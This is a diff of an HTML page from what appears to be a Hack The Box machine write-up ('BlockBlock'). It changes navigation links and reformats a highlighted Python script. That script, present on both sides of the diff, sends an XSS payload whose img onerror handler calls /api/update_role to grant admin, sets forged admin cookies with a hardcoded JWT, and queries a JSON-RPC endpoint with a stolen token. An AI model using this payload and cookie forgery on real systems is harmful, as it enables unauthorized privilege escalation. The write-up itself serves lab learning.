@@ -15,9 +15,9 @@
 <body>
     <header>
         <div class="container header-content">
-            <a href="../index.html" class="logo">All writeups</a>
+            <a href="../machines.html" class="logo">Machine writeups</a>
             <div class="header-controls">
-                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
                     <img src="../favicon.png" alt="Archive" width="30" height="30">
                 </a>
                 <div class="hamburger-menu">
@@ -130,46 +130,46 @@ Response:
 
 <p>After sending a request to the JSON-RPC endpoint, I received an authorization token. I may be able to run more commands If I append it to my requests.</p>
 <p>I managed to succesfully call the eth_blockNumber method, but I could not get any of the others to work with curl. Luckily, I found and edited a script that solved the issue entirely and allowed me to fully interact with the endpoint.</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-<span class="n">rhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10.10.11.43&#39;</span>
-<span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s1">&#39;</span>
-<span class="n">lhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10.10.16.25&#39;</span>
+<span class="n">rhost</span> <span class="o">=</span> <span class="s1">&#39;10.10.11.43&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s1">&#39;</span>
+<span class="n">lhost</span> <span class="o">=</span> <span class="s1">&#39;10.10.16.25&#39;</span>
 
-<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>
-<span class="w">    </span><span class="s2">&quot;&lt;img src=x onerror=</span><span class="se">\&quot;</span><span class="s2">fetch(&#39;/api/update_role&#39;, {method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;}, &quot;</span>
-<span class="w">    </span><span class="s2">&quot;body: JSON.stringify({ &#39;username&#39;: &#39;user&#39;, &#39;role&#39;: &#39;admin&#39;})})</span><span class="se">\&quot;</span><span class="s2"> /&gt;&quot;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="s2">&quot;&lt;img src=x onerror=</span><span class="se">\&quot;</span><span class="s2">fetch(&#39;/api/update_role&#39;, {method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;}, &quot;</span>
+    <span class="s2">&quot;body: JSON.stringify({ &#39;username&#39;: &#39;user&#39;, &#39;role&#39;: &#39;admin&#39;})})</span><span class="se">\&quot;</span><span class="s2"> /&gt;&quot;</span>
 <span class="p">)</span>
-<span class="n">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span>
 <span class="p">}</span>
-<span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
 <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Logging in and sending payload to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">login_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/api/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pass&quot;</span><span class="p">})</span>
-<span class="k">if</span><span class="w"> </span><span class="n">login_response</span><span class="o">.</span><span class="n">status_code</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="p">:</span>
-<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Login successful. Injecting primary payload.&quot;</span><span class="p">)</span>
-<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;role&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
-<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span>
-<span class="w">                </span><span class="s2">&quot;token&quot;</span><span class="p">,</span>
-<span class="w">                </span><span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0Mjg5NjIwOSwianRpIjoiMWEzM2U4YTAtNWI1Ny00MDM5LWI5ZWQtMjdlN2Q0ZDJjODhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImdyciIsIm5iZiI6MTc0Mjg5NjIwOSwiZXhwIjoxNzQzNTAxMDA5fQ.xhEBP6Vlb6WrSuYNxqCLb2Y07kU7702ZjyqTIGkDsY8&quot;</span><span class="p">,</span>
-<span class="w">                </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span>
-<span class="w">                </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
-<span class="w">            </span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
-<span class="n">jwt_secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;d549ada4bcee1df9e9a52008125a7c70a0d1e291365b91dc3374b2604495b3e9&quot;</span><span class="p">}</span>
-<span class="n">chat_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
-<span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/api/json-rpc&quot;</span>
-<span class="n">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="s2">&quot;token&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">jwt_secret</span><span class="p">[</span><span class="s2">&quot;Authorization&quot;</span><span class="p">],</span>
+<span class="n">login_response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/api/login&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;pass&quot;</span><span class="p">})</span>
+<span class="k">if</span> <span class="n">login_response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Login successful. Injecting primary payload.&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;role&quot;</span><span class="p">,</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span>
+                <span class="s2">&quot;token&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0Mjg5NjIwOSwianRpIjoiMWEzM2U4YTAtNWI1Ny00MDM5LWI5ZWQtMjdlN2Q0ZDJjODhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImdyciIsIm5iZiI6MTc0Mjg5NjIwOSwiZXhwIjoxNzQzNTAxMDA5fQ.xhEBP6Vlb6WrSuYNxqCLb2Y07kU7702ZjyqTIGkDsY8&quot;</span><span class="p">,</span>
+                <span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span>
+                <span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
+            <span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="n">domain</span><span class="o">=</span><span class="s2">&quot;blockblock.htb&quot;</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="n">jwt_secret</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="s2">&quot;d549ada4bcee1df9e9a52008125a7c70a0d1e291365b91dc3374b2604495b3e9&quot;</span><span class="p">}</span>
+<span class="n">chat_address</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/api/json-rpc&quot;</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;token&quot;</span><span class="p">:</span> <span class="n">jwt_secret</span><span class="p">[</span><span class="s2">&quot;Authorization&quot;</span><span class="p">],</span>
 <span class="p">}</span>
-<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
 <span class="p">}</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
 </code></pre></div>
 
